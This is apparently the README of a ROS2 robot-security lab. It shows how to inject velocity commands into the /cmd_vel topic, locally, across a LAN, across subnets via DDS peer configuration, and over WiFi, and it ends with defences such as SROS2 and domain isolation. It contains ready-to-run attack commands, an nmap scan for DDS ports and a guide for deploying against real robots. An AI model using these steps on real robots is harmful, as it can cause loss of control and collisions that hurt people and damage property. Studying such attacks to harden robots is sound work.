# /cmd_vel Injection Attack Experiment (English Version)

## 📋 Attack Overview

This experiment demonstrates how to perform injection attacks on the `/cmd_vel` control topic of ROS2 robots, revealing security vulnerabilities in robotic systems. Through attacks at different layers, we expose security risks in the ROS2 communication architecture.

## 🔍 ROS2 Communication Architecture and Attack Layers

### ROS2 Communication Stack

```
Application Layer (ROS2 Nodes)
    ↓
ROS2 Middleware Layer (rmw_implementation)
    ↓
DDS Layer (Data Distribution Service)
    ↓
Network Layer (UDP/TCP, Multicast/Unicast)
    ↓
Physical Layer (Ethernet/WiFi)
```

### Attack Layer Analysis

#### 1. **Application Layer Attack** (Simplest, Focus of This Experiment)
- **Location**: ROS2 Node Layer
- **Principle**: Directly create malicious nodes publishing to `/cmd_vel`
- **Requirements**: Ability to run ROS2 nodes (same machine or same network)
- **Difficulty**: ⭐ Easy
- **Use Cases**: Local attacks, system access already obtained

#### 2. **ROS2/DDS Layer Attack**
- **Location**: DDS Discovery and Communication Layer
- **Principle**: Exploit DDS automatic discovery mechanism (multicast)
- **Requirements**: Same network or configured with same ROS_DOMAIN_ID
- **Difficulty**: ⭐⭐ Medium
- **Use Cases**: Local area network attacks

#### 3. **Network Layer Attack**
- **Location**: Network Packet Layer
- **Principle**: Intercept/forge DDS packets
- **Requirements**: Network access, DDS protocol knowledge
- **Difficulty**: ⭐⭐⭐ Hard
- **Use Cases**: Man-in-the-middle attacks, network penetration

#### 4. **Physical Layer Attack**
- **Location**: Physical Network Connection
- **Principle**: Physical network access
- **Requirements**: Physical access
- **Difficulty**: ⭐⭐ Medium
- **Use Cases**: On-site attacks

## 🎯 Experiment 1: Application Layer Injection Attack (Local)

### Attack Scenario
The attacker has obtained system access and runs malicious nodes on the same machine.

### Implementation Methods

**Method A: Direct Malicious Command Publishing**

```bash
# Continuously send forward commands (make robot lose control)
ros2 topic pub /cmd_vel geometry_msgs/msg/TwistStamped \
  "{header: {stamp: {sec: 0, nanosec: 0}, frame_id: 'base_link'}, \
   twist: {linear: {x: 0.5, y: 0.0, z: 0.0}, angular: {x: 0.0, y: 0.0, z: 0.0}}}" \
  --rate 10
```

**Method B: Using Python Script (More Flexible)**

```bash
# Continuous forward attack
python3 injection_attack.py --attack-type override --frequency 50 --duration 10 --speed 0.5

# Spin attack
python3 injection_attack.py --attack-type spin --angular-speed 2.0 --duration 5

# Stealth attack (hard to detect)
python3 injection_attack.py --attack-type stealth --frequency 25 --duration 30
```

### Attack Effects
- ✅ Robot continuously moves forward, unable to stop
- ✅ Override legitimate control commands
- ✅ May cause collisions or loss of control

## 🌐 Experiment 2: Network Layer Injection Attack (Cross-Machine)

### Attack Scenario
The attacker is on another machine in the same network, injecting malicious commands over the network.

### Prerequisites

1. **Network Connection**
   - Attacker machine and target machine on the same network
   - Or DDS routing configured

2. **ROS2 Environment Configuration**

On the attacker machine:
```bash
# Install ROS2 (same version as target machine)
# Ubuntu 22.04: ros-humble-desktop
# Ubuntu 24.04: ros-jazzy-desktop

# Set the same domain ID (default is 0)
export ROS_DOMAIN_ID=0

# Or use different domain ID, but need to configure DDS routing
```

3. **DDS Configuration (If Cross-Subnet Required)**

Create `DDS_ROUTING.xml`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<CycloneDDS>
  <Domain>
    <Id>0</Id>
    <General>
      <NetworkInterfaceAddress>auto</NetworkInterfaceAddress>
      <AllowMulticast>true</AllowMulticast>
    </General>
    <Discovery>
      <ParticipantIndex>auto</ParticipantIndex>
      <Peers>
        <Peer Address="target_machine_ip"/>
      </Peers>
    </Discovery>
  </Domain>
</CycloneDDS>
```

Set environment variable:
```bash
export CYCLONEDDS_URI=file:///path/to/DDS_ROUTING.xml
```

### Attack Steps

1. **Run Attack Script on Attacker Machine**
```bash
python3 injection_attack.py --attack-type spin --duration 10
```

2. **Verify Connection**
```bash
# Check if target can be discovered on attacker machine
ros2 node list
ros2 topic list
```

3. **Execute Attack**
```bash
python3 injection_attack.py --attack-type override --speed 0.5
```

## 🖥️ Real Robot Attack Deployment Guide

### Scenario A: Same Local Area Network (Most Common)

**Topology**:
```
[Attacker Machine] ----(WiFi/Ethernet)---- [Robot]
    192.168.1.100             192.168.1.101
```

**Steps**:

1. **Ensure Network Connection**
```bash
# Ping robot from attacker machine
ping <robot_ip>
```

2. **Configure ROS2 Environment**
```bash
# On attacker machine
source /opt/ros/jazzy/setup.bash  # or humble
export ROS_DOMAIN_ID=0  # Same as robot

# Verify discovery
ros2 daemon stop  # Restart daemon
ros2 node list    # Should see robot nodes
ros2 topic list   # Should see /cmd_vel
```

3. **Execute Attack**
```bash
python3 injection_attack.py --attack-type override --speed 0.5
```

### Scenario B: Cross-Network/Subnet

**Topology**:
```
[Attacker Machine] ----(Internet/VPN)---- [Router] ---- [Robot]
  10.0.0.100                         192.168.1.1   192.168.1.101
```

**Configure DDS Routing**:

1. **Create DDS Configuration on Attacker Machine**
```bash
cat > ~/dds_attack_config.xml << EOF
<?xml version="1.0" encoding="UTF-8"?>
<CycloneDDS>
  <Domain>
    <Id>0</Id>
    <General>
      <NetworkInterfaceAddress>auto</NetworkInterfaceAddress>
      <AllowMulticast>false</AllowMulticast>
    </General>
    <Discovery>
      <ParticipantIndex>auto</ParticipantIndex>
      <Peers>
        <Peer Address="<robot_ip>"/>
      </Peers>
    </Discovery>
  </Domain>
</CycloneDDS>
EOF

export CYCLONEDDS_URI=file://$HOME/dds_attack_config.xml
```

2. **Execute Attack**
```bash
python3 injection_attack.py --attack-type override --speed 0.5
```

### Scenario C: WiFi Man-in-the-Middle Attack

If the attacker can access the same WiFi network:

1. **Access Network** (legitimate or illegitimate)
2. **Discover Robot**
```bash
# Scan for ROS2 nodes in network
nmap -p 7400-7500 <network_segment>
```

3. **Configure and Attack**
```bash
export ROS_DOMAIN_ID=0
python3 injection_attack.py --attack-type stealth
```

## 🛡️ Defense Measures

### 1. Use ROS_DOMAIN_ID Isolation
```bash
# Use non-default domain on robot
export ROS_DOMAIN_ID=42  # Use random number
```

### 2. Network Isolation
- Use firewall to restrict DDS ports
- Use VPN or dedicated network

### 3. Message Authentication
- Use SROS2 (Secure ROS2) for message encryption and authentication
- Implement node identity verification

### 4. Access Control
- Restrict network access
- Use ACL (Access Control Lists)

### 5. Monitoring and Detection
- Monitor abnormal `/cmd_vel` publishers
- Implement command validation and rate limiting

## 📊 Experiment Report Points

1. **Attack Layer**: Specify which layer the attack was performed on
2. **Attack Method**: Describe attack steps in detail
3. **Attack Effects**: Record robot's response
4. **Defense Recommendations**: Propose targeted defense measures
5. **Network Topology**: Draw network diagram of attack scenario

## ⚠️ Important Notes

1. **Educational Purpose Only**: This experiment is for security research and education only
2. **Obtain Authorization**: Ensure explicit authorization before testing on real robots
3. **Isolated Environment**: Recommended to conduct experiments in isolated network environment
4. **Data Backup**: Backup important data before experiments

## 📁 File Description

- `injection_attack.py` - Main attack script
- `deploy_to_real_robot.sh` - Real robot deployment guide script
- `README_EN.md` - This document (English version)

